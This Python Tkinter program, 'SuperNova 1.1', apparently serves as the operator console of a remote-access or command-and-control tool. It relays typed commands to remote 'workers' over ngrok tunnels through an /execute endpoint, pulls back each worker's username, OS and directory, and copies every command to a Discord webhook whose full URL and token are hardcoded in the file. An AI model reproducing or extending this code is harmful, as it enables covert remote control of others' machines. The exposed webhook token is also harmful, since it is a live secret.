import tkinter as tk
from tkinter import scrolledtext, simpledialog
import requests
import os
from dhooks import *

##““`”

hook_url = "https://discord.com/api/webhooks/1307686709886062683/UQStVdOK09gUHktWxXt1x6gVYIy_q6Sb2OWM0smEbzWr_mDUibQx-f-TK5etnr7FbQ0M"
hook = Webhook(hook_url)

help_text = """
                       SuperNova Console Help
----------------------------------------------------------------------------------------------------
help - Show this help message with a list of available commands.

exit - Exit the console application.

clear - Clear the console output area.

set ngrok [URL1, URL2, ...] - Set one or more ngrok URLs for worker communication.

update_username - Fetch and update the bot username from the first ngrok URL.

/update_username [new_username] - Manually set a new username for the bot.

pwd - updates the current directory



Note: Any other text entered will be sent as a command to all workers connected via ngrok URLs.
----------------------------------------------------------------------------------------------------
"""

ascii_art = """


  ██████  █    ██  ██▓███  ▓█████  ██▀███   ███▄    █  ▒█████   ██▒   █▓ ▄▄▄      
▒██    ▒  ██  ▓██▒▓██░  ██▒▓█   ▀ ▓██ ▒ ██▒ ██ ▀█   █ ▒██▒  ██▒▓██░   █▒▒████▄    
░ ▓██▄   ▓██  ▒██░▓██░ ██▓▒▒███   ▓██ ░▄█ ▒▓██  ▀█ ██▒▒██░  ██▒ ▓██  █▒░▒██  ▀█▄  
  ▒   ██▒▓▓█  ░██░▒██▄█▓▒ ▒▒▓█  ▄ ▒██▀▀█▄  ▓██▒  ▐▌██▒▒██   ██░  ▒██ █░░░██▄▄▄▄██ 
▒██████▒▒▒▒█████▓ ▒██▒ ░  ░░▒████▒░██▓ ▒██▒▒██░   ▓██░░ ████▓▒░   ▒▀█░   ▓█   ▓██▒
▒ ▒▓▒ ▒ ░░▒▓▒ ▒ ▒ ▒▓▒░ ░  ░░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒░   ▒ ▒ ░ ▒░▒░▒░    ░ ▐░   ▒▒   ▓▒█░
░ ░▒  ░ ░░░▒░ ░ ░ ░▒ ░      ░ ░  ░  ░▒ ░ ▒░░ ░░   ░ ▒░  ░ ▒ ▒░    ░ ░░    ▒   ▒▒ ░
░  ░  ░   ░░░ ░ ░ ░░          ░     ░░   ░    ░   ░ ░ ░ ░ ░ ▒       ░░    ░   ▒   
      ░     ░                 ░  ░   ░              ░     ░ ░        ░        ░  ░
                                                                    ░             

                   made by @wixp and @ArticHonour :D

"""

class ConsoleApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Console")
        self.ngrok_urls = []
        self.bot_username = "unknown_user"
        self.current_directory = os.getcwd()  # Start in the current working directory
        self.prompt = self.get_prompt()
        self.root.attributes('-fullscreen', True)
        # Header Label
        self.frame = tk.Frame(self.root, bg="black")
        self.frame.pack(fill=tk.BOTH, expand=True)
        self.header_label = tk.Label(self.frame, text="SuperNova 1.1", bg="white", fg="black", font=("Courier", 18, "bold"), anchor="w", padx=1)
        
        self.header_label.pack(fill=tk.X)
        # Frame for the entire console
        self.frame = tk.Frame(self.root, bg="black")
        self.frame.pack(fill=tk.BOTH, expand=True)
        self.header_label.pack(side="top", fill=tk.X, pady=5)
        
        # Output area
        self.output_area = scrolledtext.ScrolledText(self.frame, bg="black", fg="lime", wrap=tk.WORD, height=15, font=("Courier", 20))
        self.output_area.pack(padx=10, pady=10, fill=tk.BOTH, expand=True)
        
        # Input area (as a single line entry)
        self.input_area = tk.Entry(self.frame, bg="black", fg="white", insertbackground='white', font=("Courier", 20))
        self.input_area.pack(padx=10, pady=(0, 10), fill=tk.X)
        self.input_area.bind("<Return>", self.execute_command)  # Bind Enter key to command execution

        # Initialize the console with a welcome message
        self.update_output("Welcome to SuperNova Terminal\n")
        self.update_output("Type help for more info or type /Exit to exit this application\n")
        self.update_output(ascii_art)
        
        # Initial setup
        self.get_ngrok_urls()
        self.update_prompt()

    def update_output(self, message):
        """ Update the output area with new messages. """
        self.output_area.config(state=tk.NORMAL)  # Make it editable
        self.output_area.insert(tk.END, message)
        self.output_area.yview(tk.END)  # Scroll to the end
        self.output_area.config(state=tk.DISABLED)  # Make it read-only
        
    def execute_command(self , event=None):
        """ Execute the command entered in the input area. """
        command = self.input_area.get().strip()  # Get the command from input area
        self.input_area.delete(0, tk.END)  # Clear input area
        self.output_area.insert(tk.END, f"\n{self.prompt}{command}\n")  # Show command in output area

        # Process the command
        if command.lower() == 'exit':
            self.update_output("Exiting...\n")
            self.root.after(1000, self.root.quit)  # Close after a second
        elif command.lower() == 'clear':
            self.clear_console()
        elif command.lower() == 'help':
            self.update_output(ascii_art)
            self.update_output(help_text)
        elif command.lower().startswith("set ngrok "):
            self.ngrok_urls = command.split(" ")[2:]  # Get ngrok URLs from command
            self.update_output(f"Ngrok URLs set: {self.ngrok_urls}\n")
        elif command.lower() == "update_username":
            self.update_username()
        elif command.startswith("/update_username "):
            self.bot_username = command.split(" ", 1)[1]  # Extract the new username from the command
            self.update_username()
        elif command.startswith("cd "):
            self.change_directory(command.split(" ", 1)[1])
            self.send_command_to_worker(command)
        elif command.lower() == "pwd":
            self.show_current_directory()
        else:
            self.send_command_to_worker(command)

        self.update_prompt()  # Update the prompt after command execution
        return "break"  # Prevent default behavior of the Return key

    def clear_console(self):
        """ Clear the output area of the console. """
        self.output_area.config(state=tk.NORMAL)  # Make it editable
        self.output_area.delete(1.0, tk.END)  # Delete all text in the output area

    def get_ngrok_urls(self):
        """ Prompt for ngrok URLs from the user. """
        urls = simpledialog.askstring("Ngrok URLs", "Enter the ngrok public URLs separated by commas:")
        if urls:
            self.ngrok_urls = [url.strip() for url in urls.split(",")]
            self.update_output(f"Ngrok URLs set: {self.ngrok_urls}\n")
            # After setting URLs, update the username from the first URL
            if self.ngrok_urls:
                self.update_username()

    def update_username(self):
        """ Update the bot's username across all ngrok URLs. """
        for ngrok_url in self.ngrok_urls:
            current_username = self.get_username(ngrok_url)
            if current_username:
                self.update_output(f"Current username: {current_username}\n")
                self.bot_username = current_username  # Replace bot_username with current_username
                self.update_prompt()
                self.send_username_update(ngrok_url, self.bot_username)

    def update_prompt(self):
        """ Update the command prompt based on username and current directory. """
        self.prompt = self.get_prompt()
        self.output_area.config(state=tk.NORMAL)  # Make it editable to add the new prompt
        self.output_area.insert(tk.END, self.prompt)  # Insert the new prompt
        self.output_area.mark_set("insert", tk.END)  # Move the cursor to the end
        self.output_area.config(state=tk.DISABLED)  # Make it read-only again

    def get_prompt(self):
        """ Generate the command prompt string based on username, operating system, and current directory. """
        # Get the operating system from the worker (first ngrok URL)
        operating_system = "unknown_os"  # Initialize with a default value
        if self.ngrok_urls:
            operating_system = self.get_current_os_from_worker(self.ngrok_urls[0])  # Fetch the OS from the first ngrok URL

    # Get the relative path for the directory
        relative_path = os.path.relpath(self.current_directory, os.path.expanduser("~"))
        if relative_path.startswith(".."):
        # Handle paths outside the home directory by showing the full path
            return f"{self.bot_username}@{operating_system}:{self.current_directory}$ "
        else:
        # Show relative path if inside the home directory
            return f"{self.bot_username}@{operating_system}:~/{relative_path}$ "

    def change_directory(self, path):
        """ Change the current directory if the specified path exists. """
        try:
            # Normalize the path to avoid issues with relative paths
            new_directory = os.path.normpath(os.path.join(self.current_directory, path))
            if os.path.isdir(new_directory):
                self.current_directory = new_directory
                self.update_output(f"Changed directory to {self.current_directory}\n")
            else:
                self.update_output(f"Directory '{path}' does not exist.\n")
        except Exception as e:
            self.update_output(f"Error changing directory: {e}\n")

    def show_current_directory(self):
        """ Display and update the current directory fetched from the worker. """
        for ngrok_url in self.ngrok_urls:
            current_dir = self.get_current_directory_from_worker(ngrok_url)
            if current_dir:
                self.current_directory = current_dir  # Update current directory
                self.update_output(f"Current directory from {ngrok_url}: {current_dir}\n")
                self.update_prompt()  # Update the prompt to reflect the new directory
            else:
                self.update_output(f"Failed to get current directory from {ngrok_url}.\n")

    def get_current_directory_from_worker(self, url):
        """ Get the current directory from a worker at the specified URL. """
        endpoint = f"{url}/pwd"
        try:
            response = requests.get(endpoint)
            response.raise_for_status()
            directory = response.json().get('current_dir', 'current_directory')
            return directory
        except requests.exceptions.RequestException as e:
            self.update_output(f"Failed to get current directory from {url}. Error: {e}\n")
            return None

    def get_current_os_from_worker(self, url):
        """ Get the current Operating system from a worker at the specified URL. """
        endpoint = f"{url}/operating_system"
        try:
            return requests.get(f"{url}/operating_system").json().get('OPERATING_SYSTEM', 'unknown_os')
        except requests.exceptions.RequestException as e:
            self.update_output(f"Failed to get current OS from {url}. Error: {e}\n")
            return None

    def get_username(self, url):
        """ Get the username from a worker at the specified URL. """
        endpoint = f"{url}/get_username"
        try:
            response = requests.get(endpoint)
            response.raise_for_status()
            return response.json().get('username', 'Unknown User')
        except requests.exceptions.RequestException as e:
            self.update_output(f"Failed to get username from {url}. Error: {e}\n")
            return None

    def send_username_update(self, url, username):
        """ Send the updated username to the worker at the specified URL. """
        endpoint = f"{url}/update_username"
        try:
            response = requests.post(endpoint, json={'username': username})
            response.raise_for_status()
            result = response.json().get('message', 'No result received')
        except requests.exceptions.RequestException as e:
            self.update_output(f"Failed to send username update to {url}. Error: {e}\n")
            return None

    def send_command_to_worker(self, command):
        """ Send the given command to all workers via ngrok URLs. """
        for ngrok_url in self.ngrok_urls:
            self.update_output(f"{command}\n")
            endpoint = f"{ngrok_url}/execute"
            try:
                hook.send(f"```diff\n+ {command}\n```")
            except:
                self.update_output("\nFailed to send command to live-execution")
            try:
                response = requests.post(endpoint, json={'command': command})
                response.raise_for_status()  
                result = response.json().get('result', 'No result received')
                self.update_output(f"{result}\n")
            except requests.exceptions.RequestException as e:
                self.update_output(f"Failed to send command to {ngrok_url}. Error: {e}\n")
            except ValueError:
                self.update_output("Response is not in JSON format\n")

if __name__ == "__main__":
    root = tk.Tk()
    console_app = ConsoleApp(root)
    root.mainloop()
